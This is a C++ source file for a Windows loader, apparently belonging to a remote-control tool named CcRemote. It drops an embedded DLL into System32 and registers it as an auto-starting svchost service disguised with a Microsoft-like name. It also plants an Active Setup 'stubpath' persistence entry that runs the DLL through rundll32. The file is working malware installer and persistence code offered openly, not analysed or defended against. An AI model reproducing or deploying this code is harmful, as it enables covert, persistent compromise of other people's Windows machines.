// Loder.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
//

#include <iostream>
#include <Windows.h>
#include "resource.h"
#include "RegEditEx.h"


bool CreateMyFile(const char* strFilePath, LPBYTE lpBuffer, DWORD dwSize)
{
	DWORD dwWritten;

	HANDLE hFile = CreateFile(strFilePath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
	if (hFile != NULL)
	{
		WriteFile(hFile, (LPCVOID)lpBuffer, dwSize, &dwWritten, NULL);
	}
	else
	{
		return false;
	}
	CloseHandle(hFile);
	return true;
}
//要释放的路径   资源ID            资源名
bool CreateEXE(const char* strFilePath, int nResourceID, const char* strResourceName)
{
	HRSRC hResInfo;
	HGLOBAL hResData;
	DWORD dwSize;
	LPBYTE p;
	// 查找所需的资源
	hResInfo = FindResource(NULL, MAKEINTRESOURCE(nResourceID), strResourceName);
	if (hResInfo == NULL)
	{
		//MessageBox(NULL, "查找资源失败！", "错误", MB_OK | MB_ICONINFORMATION);
		return false;
	}
	// 获得资源尺寸
	dwSize = SizeofResource(NULL, hResInfo);
	// 装载资源
	hResData = LoadResource(NULL, hResInfo);
	if (hResData == NULL)
	{
		//MessageBox(NULL, "装载资源失败！", "错误", MB_OK | MB_ICONINFORMATION);
		return false;
	}
	// 为数据分配空间
	p = (LPBYTE)GlobalAlloc(GPTR, dwSize);
	if (p == NULL)
	{
		//MessageBox(NULL, "分配内存失败！", "错误", MB_OK | MB_ICONINFORMATION);
		return false;
	}
	// 复制资源数据
	CopyMemory((LPVOID)p, (LPCVOID)LockResource(hResData), dwSize);

	bool bRet = CreateMyFile(strFilePath, p, dwSize);
	if (!bRet)
	{
		GlobalFree((HGLOBAL)p);
		return false;
	}

	GlobalFree((HGLOBAL)p);

	return true;
}

char *AddsvchostService()
{
	char	*lpServiceName = NULL;
	int rc = 0;
	HKEY hkRoot;
	char buff[2048];
	//打开装所有svchost服务名的注册表键
	//query svchost setting
	char *ptr;
	char pSvchost[] = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Svchost";
	rc = RegOpenKeyEx(HKEY_LOCAL_MACHINE, pSvchost, 0, KEY_ALL_ACCESS, &hkRoot);
	if (ERROR_SUCCESS != rc)
		return NULL;

	DWORD type, size = sizeof buff;
	//枚举他所有的服务名
	rc = RegQueryValueEx(hkRoot, "netsvcs", 0, &type, (unsigned char*)buff, &size);
	SetLastError(rc);
	if (ERROR_SUCCESS != rc)
		RegCloseKey(hkRoot);

	int i = 0;
	bool bExist = false;
	char servicename[50];
	do
	{
		//这里获得类似这样的服务名netsvcs_0，netsvcs_1。。。。。。。
		wsprintf(servicename, "netsvcs_0x%d", i);
		for (ptr = buff; *ptr; ptr = strchr(ptr, 0) + 1)
		{
			//然后比对一下服务名中是否有这个名字了
			if (lstrcmpi(ptr, servicename) == 0)
			{
				bExist = true;
				break;              //如果没有就跳出
			}
		}
		if (bExist == false)
			break;
		bExist = false;
		i++;
	} while (1);

	servicename[lstrlen(servicename) + 1] = '\0';
	//然后将这个服务名写到所有服务名的后面，
	//不要妄想，直接用api在一个注册表的键值后面添加一些信息
	memcpy(buff + size - 1, servicename, lstrlen(servicename) + 2);
	//然后将含有新服务名的缓冲区写入注册表，注册表里原有内容被覆盖
	rc = RegSetValueEx(hkRoot, "netsvcs", 0, REG_MULTI_SZ, (unsigned char*)buff, size + lstrlen(servicename) + 1);

	RegCloseKey(hkRoot);

	SetLastError(rc);

	if (bExist == false)
	{
		lpServiceName = new char[lstrlen(servicename) + 1];
		lstrcpy(lpServiceName, servicename);
	}
	//回到 InstallService
	return lpServiceName;
}

void StartService(LPCTSTR lpService)
{
	SC_HANDLE hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
	if (NULL != hSCManager)
	{
		SC_HANDLE hService = OpenService(hSCManager, lpService, DELETE | SERVICE_START);
		if (NULL != hService)
		{
			StartService(hService, 0, NULL);
			CloseServiceHandle(hService);
			printf("lpService");
		}
		CloseServiceHandle(hSCManager);
	}
}


int main()
{

	//CreateEXE("E:\\aaa.dll", IDR_DLL1, "DLL");
	char lpServiceDescription[]= "CcRemote服务";
	char strModulePath[MAX_PATH];
	char	strSysDir[MAX_PATH];
	char strSubKey[1024];
	DWORD	dwStartType = 0;
	char	strRegKey[1024];
	int rc = 0;
	HKEY hkRoot = HKEY_LOCAL_MACHINE, hkParam = 0;
	SC_HANDLE hscm = NULL, schService = NULL;

	//打开服务
	hscm = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	GetSystemDirectory(strSysDir, sizeof(strSysDir));
	char bin[] = "%SystemRoot%\\System32\\svchost.exe -k netsvcs";
	char *lpServiceName = AddsvchostService();                             //*添加的代码在这个函数中*
	char lpServiceDisplayName[128] = {0};
	wsprintf(lpServiceDisplayName, "%s_ms,", lpServiceName);
	//这里返回新的服务名后就构造服务dll的名字
	memset(strModulePath, 0, sizeof(strModulePath));
	wsprintf(strModulePath, "%s\\%sex.dll", strSysDir, lpServiceName);

	//然后构造服务中的描述信息的位置
	wsprintf(strRegKey, "MACHINE\\SYSTEM\\CurrentControlSet\\Services\\%s", lpServiceName);

	schService = CreateService(
		hscm,						// SCManager database
		lpServiceName,              // name of service
		lpServiceDisplayName,       // service name to display
		SERVICE_ALL_ACCESS,			// desired access
		SERVICE_WIN32_OWN_PROCESS,
		SERVICE_AUTO_START,			// start type
		SERVICE_ERROR_NORMAL,		// error control type
		bin,						// service's binary
		NULL,						// no load ordering group
		NULL,						// no tag identifier
		NULL,						// no dependencies
		NULL,						// LocalSystem account
		NULL);						// no password
	dwStartType = SERVICE_WIN32_OWN_PROCESS;

	if (schService == NULL)
	{
		throw "CreateService(Parameters)";
		printf("schServicenull");
	}
		

	CloseServiceHandle(schService);
	CloseServiceHandle(hscm);

	hkRoot = HKEY_LOCAL_MACHINE;
	//这里构造服务的描述键
	wsprintf(strSubKey, "SYSTEM\\CurrentControlSet\\Services\\%s", lpServiceName);
	if (dwStartType == SERVICE_WIN32_SHARE_PROCESS)
	{
		DWORD	dwServiceType = 0x120;

		//写入服务的描述
		WriteRegEx(HKEY_LOCAL_MACHINE, strSubKey, "Type", REG_DWORD, (char *)&dwServiceType, sizeof(DWORD), 0);
	}
	//写入服务的描述
	WriteRegEx(HKEY_LOCAL_MACHINE, strSubKey, "Description", REG_SZ, (char *)lpServiceDescription, lstrlen(lpServiceDescription), 0);

	lstrcat(strSubKey, "\\Parameters");
	//写入服务的描述
	WriteRegEx(HKEY_LOCAL_MACHINE, strSubKey, "ServiceDll", REG_EXPAND_SZ, (char *)strModulePath, lstrlen(strModulePath), 0);

	printf("123");
	if (schService != NULL)
	{
		CreateEXE(strModulePath, IDR_DLL1, "DLL");
		StartService(lpServiceName);
	}
	RegCloseKey(hkRoot);
	RegCloseKey(hkParam);
	CloseServiceHandle(schService);
	CloseServiceHandle(hscm);
	system("pause");
	return 0;

}



BOOL GetNUM(char *num)
{
	CoInitialize(NULL);
	char buf[64] = { 0 };
	GUID guid;
	if (S_OK == ::CoCreateGuid(&guid))
	{
		_snprintf(buf, sizeof(buf)
			, "{%08X-%04X-%04x-%02X%02X-%02X%02X%02X%02X%02X%02X}"
			, guid.Data1
			, guid.Data2
			, guid.Data3
			, guid.Data4[0], guid.Data4[1], guid.Data4[2]
			, guid.Data4[3], guid.Data4[4], guid.Data4[5]
			, guid.Data4[6], guid.Data4[7]
		);
	}
	CoUninitialize();
	memcpy(num, buf, 64);
	return TRUE;
}

void ActiveXSetup()
{
	HKEY hKey;
	char strFileName[MAX_PATH];            // dll文件名
	char ActivexStr[1024];                 // 用于存储ActiveX的键字串
	char ActiveXPath[MAX_PATH];            // ActiveX路径
	char ActiveXKey[64];                   // ActiveX 的GUID字串
	char strCmdLine[MAX_PATH];             // 存储启动的命令行参数


	ZeroMemory(strFileName, MAX_PATH);
	ZeroMemory(ActiveXPath, MAX_PATH);
	ZeroMemory(ActivexStr, 1024);
	ZeroMemory(ActiveXKey, MAX_PATH);
	ZeroMemory(strCmdLine, MAX_PATH);

	//得到Activex路径
	strcpy(ActiveXPath, "SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\");
	//得到Activex的GUID
	GetNUM(ActiveXKey);
	//构造dll完整文件名
	GetSystemDirectory(strFileName, MAX_PATH);
	strcat(strFileName, "\\");
	strcat(strFileName, ActiveXKey);
	strcat(strFileName, ".dll");


	//构造ActiveX的注册表键值
	sprintf(ActivexStr, "%s%s", ActiveXPath, ActiveXKey);
	//创建这个注册表
	RegCreateKey(HKEY_LOCAL_MACHINE, ActivexStr, &hKey);

	//构造程序启动的命令行参数
	sprintf(strCmdLine, "%s %s,FirstRun", "rundll32.exe", strFileName);
	//将参数写道注册表中
	RegSetValueEx(hKey, "stubpath", 0, REG_EXPAND_SZ, (BYTE *)strCmdLine, lstrlen(strCmdLine));
	RegCloseKey(hKey);
	//释放文件
	CreateEXE(strFileName, IDR_DLL1, "DLL");

	//启动服务端
	STARTUPINFO StartInfo;
	PROCESS_INFORMATION ProcessInformation;
	StartInfo.cb = sizeof(STARTUPINFO);
	StartInfo.lpDesktop = NULL;
	StartInfo.lpReserved = NULL;
	StartInfo.lpTitle = NULL;
	StartInfo.dwFlags = STARTF_USESHOWWINDOW;
	StartInfo.cbReserved2 = 0;
	StartInfo.lpReserved2 = NULL;
	StartInfo.wShowWindow = SW_SHOWNORMAL;
	BOOL bReturn = CreateProcess(NULL, strCmdLine, NULL, NULL, FALSE, NULL, NULL, NULL, &StartInfo, &ProcessInformation);
	return;
}
